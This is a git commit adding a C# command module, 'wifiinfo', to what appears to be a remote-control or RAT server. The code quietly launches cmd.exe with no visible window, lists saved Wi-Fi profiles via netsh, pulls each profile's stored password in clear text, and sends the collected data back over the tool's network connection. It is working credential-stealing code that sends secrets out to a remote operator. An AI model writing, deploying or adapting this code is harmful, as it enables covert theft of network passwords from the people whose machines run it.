4af1ef9f349c15164e82987a22717662300c1ca6
Valsov <Valsov@DESKTOP-54TDIGM>
2018-03-03 18:31:43 +0100

    WifiInfo command

---
+++ ServerCommands/WifiInfo.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using Shared;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading;
+
+namespace ServerCommands
+{
+    internal class WifiInfo : ICommand
+    {
+        public string name { get; } = "wifiinfo";
+
+
+        public void Process(List<string> args)
+        {
+            // Get wifi profiles names
+            var cmd = "/C netsh wlan show profiles";
+            var proc = new Process
+            {
+                StartInfo =
+                {
+                    FileName = "cmd.exe",
+                    Arguments = cmd,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    RedirectStandardOutput = true,
+                    StandardOutputEncoding = Encoding.GetEncoding(850)
+                }
+            };
+            proc.Start();
+
+            var profiles = proc.StandardOutput.ReadToEnd()
+                .Split('\n')
+                .Where(x => x.Contains(':') && x.Length > 5)
+                .Skip(1)
+                .Select(x => x.Substring(x.LastIndexOf(':') + 2, x.Length - x.LastIndexOf(':') - 3))
+                .ToList();
+            proc.WaitForExit();
+
+            // For each profile, get its informations, including the clear stored key
+            var data = "";
+            foreach (var profile in profiles)
+            {
+                proc.StartInfo.Arguments = $"/C netsh wlan show profile \"{profile}\" key=clear";
+                proc.Start();
+                data += proc.StandardOutput.ReadToEnd();
+            }
+            data += "{end}";
+
+            ServerCommandsManager.networkManager.WriteLine(data);
+        }
+    }
+}
